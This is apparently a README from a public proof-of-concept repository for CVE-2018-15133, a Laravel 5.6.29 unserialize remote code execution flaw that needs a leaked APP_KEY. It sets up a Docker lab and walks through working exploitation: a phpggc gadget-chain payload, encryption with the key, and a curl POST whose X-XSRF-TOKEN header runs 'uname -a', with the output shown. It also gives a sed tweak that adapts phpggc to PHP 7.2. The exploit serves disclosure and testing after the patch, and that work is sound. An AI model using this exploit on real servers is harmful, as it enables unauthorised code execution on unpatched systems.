# Laravel Remote Code Execution when APP_KEY is leaked PoC (CVE-2018-15133)

This repository contains a simple Laravel 5.6.29 application on PHP 7.2.10 with one basic `noop` route added in `routes/web.php` (see `Dockerfile`) and Proof of Concept exploit (`cve-2018-15133.php`) for CVE-2018-15133 that should successfully exploit the Laravel application and execute `uname -a` on the target system.

### Instructions on how to get the application running, and execute `uname -a` on the target system

```
# Build the Docker image (or skip this step and fetch from kozmico/laravel-poc-cve-2018-15133):
docker build -t laravel-poc-cve-2018-15133 .
# Launch the container and expose it on localhost:8000:
docker run -d -p 8000:8000 laravel-poc-cve-2018-15133
# A vanilla Laravel 5.6.29 on PHP 7.2.10 should now be running on http://localhost:8000
```

To execute `uname -a` on the demo-app running Laravel 5.6.29 we do the following:
* Retrieve `APP_KEY` from the running Laravel application
* Generate unserialize payload which will execute `system("uname -a");`
* Encrypt the unserialize payload with the `APP_KEY`
* Send the encrypted payload in a POST request header, and see that the code executed. Success!


## Example exploitation that executes `uname -a`
```
# Get APP_KEY:
$ docker exec -it $(docker ps --latest --quiet) grep -e \^APP_KEY /var/www/html/laravel/.env
APP_KEY=base64:9UZUmEfHhV7WXXYewtNRtCxAYdQt44IAgJUKXk2ehRk=

# Generate unserialize payload:
$ phpggc Laravel/RCE1 'uname -a' -b # Note: Vanilla phpggc will only work on PHP 5.6, this is a modified version
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg6InVuYW1lIC1hIjt9

# Encrypt payload with APP_KEY:
$ ./cve-2018-15133.php 9UZUmEfHhV7WXXYewtNRtCxAYdQt44IAgJUKXk2ehRk= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg6InVuYW1lIC1hIjt9

'PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

HTTP header for POST request: 
X-XSRF-TOKEN: eyJpdiI6Imp3c1BUejE5aGFFUVM4a0NcLzIyODBnPT0iLCJ2YWx1ZSI6InZrTEdOY2o1NlVJdlltWFl3OFBxTEY1a1pCZWlaSDRSdXM1STNSa21sSE5Cb3hFd09cL2JUdU0wWHhjK0dUU0dYQzlTd3ZYSm50NTc4NW90UnNrZW5mMHc2RHdcLzZia01cL29wVUhjQml5cCtmZ1VcL2lwbnVySG52MHEwWXdZMVFVSXhWYjFEQlwveTZPQ3JORnRYdVQyeVFnODM1UGVCSVFcL3B6RGs2VDczOTZEbkFKdFwvc3lpZXBtcUo4VllLNU4zS0pMV3ZBUlNXZDRHRmNnOG1vOFZUWDVicE5uV0FcL1NSXC9HRjh2XC9YR2pLUDlEdlEwaytWRHl5TFhvb3RXM0Y4ejNXIiwibWFjIjoiOTMwMTNkZDYwYzNjYmQ1YTg4ZjRmNjM2NmZhMzBjNzA5NTgzYmI0ZWM3Y2MzOGM4YmExYjM2ZTVkOTIzZDJjYyJ9

# Send the exploit payload and see that 'uname  -a' executed since we can see 'Linux ad66c19a7ab5 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 16:00:05 UTC 2018 x86_64 GNU/Linux' in the first line of the response:
$ curl localhost:8000 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Imp3c1BUejE5aGFFUVM4a0NcLzIyODBnPT0iLCJ2YWx1ZSI6InZrTEdOY2o1NlVJdlltWFl3OFBxTEY1a1pCZWlaSDRSdXM1STNSa21sSE5Cb3hFd09cL2JUdU0wWHhjK0dUU0dYQzlTd3ZYSm50NTc4NW90UnNrZW5mMHc2RHdcLzZia01cL29wVUhjQml5cCtmZ1VcL2lwbnVySG52MHEwWXdZMVFVSXhWYjFEQlwveTZPQ3JORnRYdVQyeVFnODM1UGVCSVFcL3B6RGs2VDczOTZEbkFKdFwvc3lpZXBtcUo4VllLNU4zS0pMV3ZBUlNXZDRHRmNnOG1vOFZUWDVicE5uV0FcL1NSXC9HRjh2XC9YR2pLUDlEdlEwaytWRHl5TFhvb3RXM0Y4ejNXIiwibWFjIjoiOTMwMTNkZDYwYzNjYmQ1YTg4ZjRmNjM2NmZhMzBjNzA5NTgzYmI0ZWM3Y2MzOGM4YmExYjM2ZTVkOTIzZDJjYyJ9'| head -n 2

Linux ad66c19a7ab5 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 16:00:05 UTC 2018 x86_64 GNU/Linux
<!DOCTYPE html>
<html lang="en">
```

phpggc modification for PHP 7.2: `sed -i -e 's/assert/system/g' gadgetchains/Laravel/RCE/1/gadgets.php`

# Timeline
* 2018-08-07: Vulnerability reported by [@kozmic](https://twitter.com/kozmic) to Laravel's security contact and [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133) assigned by Mitre
* 2018-08-07: First respond from security contact after 7 minutes (impressive!)
* 2018-08-07: Clarifications and more details shared about the vulnerability
* 2018-08-08: Laravel 5.6.30 and Laravel 5.5.42 released which patches the vulnerability
* 2018-09-26: PoC is published by [@kozmic](https://twitter.com/kozmic) on https://github.com/kozmic/laravel-poc-CVE-2018-15133/

